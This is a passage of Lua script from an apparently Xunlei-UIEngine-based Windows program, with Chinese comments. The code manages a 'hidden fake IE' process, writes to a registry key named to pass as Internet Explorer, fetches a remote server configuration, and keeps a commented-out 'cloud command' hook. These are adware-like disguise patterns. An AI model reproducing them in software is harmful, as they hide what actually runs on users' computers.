			local nKillSelfDelay = tLocalUserConfig["nKillSelfDelay"]
			SetOnceTimer(function() tipUtil:Exit("Exit") end, nKillSelfDelay or 0)
		end)
		
		--拉起云指令
		--RunJsHost()
	else
		--非开机启动，则发自杀消息,杀掉隐藏的伪IE
		tipAsynUtil:AsynPostWndMsg(nil,"{C3CE0473-57F7-4a0a-9CF4-C1ECB8A3C514}_dsmainmsg_ie",1024+401,0,0,function(nRet)
		end)
	end
	
	--在TipMain后通过判断bHideFakeIE，设置窗口位置、可见性
	TipMain()
	
	--将本次启动的日期写到注册表
	local sCurDate = os.date("%Y-%m-%d", os.time())
	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\LastRunTime", sCurDate)
	
	--非开机启动开启视频过滤
	if not bHideFakeIE then
		SendRuleListtToFilterThread()
	end
	local timerManager = XLGetObject("Xunlei.UIEngine.TimerManager")
	timerManager:SetTimer(function(item, id)
		item:KillTimer(id)
		FunctionObj.DownLoadServerConfig(AnalyzeServerConfig)
	end, 1000)
end

PreTipMain()



